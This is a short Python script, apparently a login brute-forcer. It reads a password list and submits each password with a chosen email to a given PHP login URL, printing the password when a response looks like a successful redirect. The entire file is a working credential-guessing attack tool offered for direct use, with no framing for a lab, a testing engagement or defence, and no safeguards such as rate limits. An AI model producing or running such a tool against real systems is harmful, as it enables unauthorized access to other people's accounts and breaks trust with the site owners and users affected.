import requests

def load_passwords(file_path):
    """
    Load a list of passwords from a file.

    Parameters:
    file_path (str): The path to the file containing the passwords.

    Returns:
    list: A list of passwords.
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            passwords = file.read().splitlines()
    except UnicodeDecodeError:
        with open(file_path, 'r', encoding='latin-1') as file:
            passwords = file.read().splitlines()
    return passwords

def brute_force_login(url, email, password_list, use_session=True):
    """
    Attempts to brute force the login for a given email using a list of passwords.

    Parameters:
    url (str): The URL of the login page.
    email (str): The email to login with.
    password_list (list): A list of passwords to try.
    use_session (bool): Whether to use session for requests.

    Returns:
    str: The password if found, otherwise None.
    """
    def attempt_login(session, payload):
        response = session.post(url, data=payload)
        print(f"Headers: {response.headers}")
        # Check if the login was successful by looking for specific text or headers
        if "location: home" in response.text.lower() or response.url.endswith("home"):
            return True
        return False

    session = requests.Session() if use_session else requests
    for password in password_list:
        payload = {'email': email, 'password': password}
        if attempt_login(session, payload):
            print(f"Login successful with password: {password}")
            return password
        else:
            print(f"Login failed for password: {password}")
    
    print("Password not found in the provided list.")
    return None

if __name__ == "__main__":
    url = input("Enter the login URL of the PHP application (e.g., http://example.com/login.php): ")
    email = input("Enter the email to brute force: ")
    password_file = input("Enter the path to the password file (e.g., passwords.txt): ")

    password_list = load_passwords(password_file)
    
    # First try with session
    print("Trying with session...")
    if not brute_force_login(url, email, password_list, use_session=True):
        # If that fails, try without session
        print("Trying without session...")
        brute_force_login(url, email, password_list, use_session=False)
